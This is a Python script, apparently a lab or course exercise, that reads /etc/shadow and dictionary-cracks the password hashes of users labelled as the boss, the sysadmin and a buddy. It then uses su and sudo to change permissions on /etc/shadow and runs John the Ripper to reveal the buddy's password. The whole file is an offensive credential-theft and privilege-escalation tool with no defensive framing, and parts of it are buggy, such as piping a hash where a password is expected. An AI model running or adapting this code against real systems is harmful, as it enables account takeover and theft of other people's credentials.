import crypt
import subprocess

with open ("/etc/shadow") as f:
	my_input = f.readlines()

with open ("dictionary.txt") as d:
	my_dict = d.read()

def findWord(dict,passW):
	for word in dict:
		if passW == crypt.crypt(word.lower(),passW[:16]):
			return word.lower()
	return "error: nothing found"

def getHahsedPW (userName, my_intput):
	for line in my_intput:
		word = line.split(":")
		if word[0] == userName:
			return word[1]
	return "error: no user found"	

bossName = "yourboss"
sysAdminName = "sysadmin"
bodyName ="yourbuddy"

boss_password = getHahsedPW(bossName,my_input)
sys_admin_password = getHahsedPW(sysAdminName,my_input)
your_buddy_password = getHahsedPW(bodyName,my_input)

print(findWord(my_dict.split(),boss_password))
print(findWord(my_dict.split(),sys_admin_password))

temp = f"su {sysAdminName} -c \"echo {sys_admin_password} | sudo -S chmod 640 /etc/shadow\""
subprocess.run(temp, stdout = subprocess.PIPE, universal_newlines = True, input = sys_admin_password , stderr=subprocess.STDOUT, shell = True)

subprocess.run("john --wordlist=/usr/share/john/password.lst /root/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True)
myOutPut = (subprocess.run("john --show /root/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True))
splited = (str(myOutPut).split(":"))
for x in range(len(splited)):
	if bodyName in splited[x]:
		print(splited[x+1])
		break